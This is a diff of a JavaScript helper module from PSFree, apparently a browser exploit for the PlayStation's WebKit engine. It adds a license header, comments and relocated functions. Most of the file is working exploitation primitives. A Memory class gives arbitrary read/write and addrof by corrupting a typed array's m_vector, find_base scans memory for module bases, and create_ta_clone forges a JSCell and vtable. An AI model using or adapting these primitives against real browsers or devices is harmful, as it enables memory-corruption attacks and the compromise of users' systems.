@@ -1,16 +1,22 @@
+/* Copyright (C) 2023-2024 anonymous
+
+This file is part of PSFree.
+
+PSFree is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as
+published by the Free Software Foundation, either version 3 of the
+License, or (at your option) any later version.
+
+PSFree is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
+
 import { Int, lohi_from_one, view_m_vector, view_m_length, KB, page_size } from './offset.js';
-export function find_base(addr, is_text, is_back) {
-    // align to page size
-    addr = align(addr, page_size);
-    const offset = (is_back ? -1 : 1) * page_size;
-    while (true) {
-        if (check_magic_at(addr, is_text)) {
-            break;
-        }
-        addr = addr.add(offset)
-    }
-    return addr;
-}
+
 export class DieError extends Error {
     constructor(...args) {
         super(...args);
@@ -22,15 +28,14 @@ export function die(msg='') {
     throw new DieError(msg);
 }
 
-//const console = document.getElementById('console');
-//export function debug_log(msg='') {
-//    console.append(msg + '\n');
-//}
-export const debug_log = print; 
-window.debug_log = debug_log;
+// const console = document.getElementById('console');
+// export function debug_log(msg='') {
+//     console.append(msg + '\n');
+// }
+export const debug_log = (string) => log(string, LogLevel.LOG);
 
 export function clear_log() {
-    console.innerHTML = null;
+    // console.innerHTML = null;
 }
 
 export function str2array(str, length, offset) {
@@ -126,6 +131,31 @@ export class BufferView extends Uint8Array {
     }
 }
 
+// WARNING: These functions are now deprecated. use BufferView instead.
+
+// view.buffer is the underlying ArrayBuffer of a TypedArray, but since we will
+// be corrupting the m_vector of our target views later, the ArrayBuffer's
+// buffer will not correspond to our fake m_vector anyway.
+//
+// can't use:
+//
+// function read32(u8_view, offset) {
+//     let res = new Uint32Array(u8_view.buffer, offset, 1);
+//     return res[0];
+// }
+//
+// to implement read32, we need to index the view instead:
+//
+// function read32(u8_view, offset) {
+//     let res = 0;
+//     for (let i = 0; i < 4; i++) {
+//         res += u8_view[offset + i] << i*8;
+//     }
+//     // << returns a signed integer, >>> converts it to unsigned
+//     return res >>> 0;
+// }
+
+// for reads less than 8 bytes
 function read(u8_view, offset, size) {
     let res = 0;
     for (let i = 0; i < size; i++) {
@@ -310,6 +340,17 @@ export class Addr extends Int {
     }
 }
 
+// expected:
+// * main - Uint32Array whose m_vector points to worker
+// * worker - DataView
+//
+// addrof() expectations:
+// * obj - we will store objects at .addr
+// * addr_addr - Int where to read out the address. the address used to store
+//   the value of .addr
+//
+// the relative read/write methods expect the offset to be a unsigned 32-bit
+// integer
 export class Memory {
     constructor(main, worker, obj, addr_addr)  {
         this._main = main;
@@ -438,6 +479,14 @@ export class Memory {
             worker.getUint32(offset + 4, true),
         );
     }
+
+    // writes using 0 as a base address don't work because we are using a
+    // DataView as a worker. work around this by doing something like "new
+    // Addr(-1, -1).write8(1, 0)"
+    //
+    // see setIndex() from
+    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
+    // 8.00
 
     write8(addr, value) {
         this.set_addr(addr);
@@ -603,7 +652,18 @@ function check_magic_at(p, is_text) {
 // // 0 distance away from module_base_addr.
 // addr.read8(-1);
 //
-
+export function find_base(addr, is_text, is_back) {
+    // align to page size
+    addr = align(addr, page_size);
+    const offset = (is_back ? -1 : 1) * page_size;
+    while (true) {
+        if (check_magic_at(addr, is_text)) {
+            break;
+        }
+        addr = addr.add(offset)
+    }
+    return addr;
+}
 
 // gets the address of the underlying buffer of a JSC::JSArrayBufferView
 export function get_view_vector(view) {
@@ -784,7 +844,7 @@ export function create_ta_clone(obj) {
         o.jsta_impl,
         get_view_vector(m_wrapped_clone),
     );
-    write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
+    rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
 
     // turn the empty object into a textarea (copy JSCell header)
     //
@@ -798,3 +858,4 @@ export function create_ta_clone(obj) {
 
     return clone_p;
 }
+window.create_ta_clone = create_ta_clone;
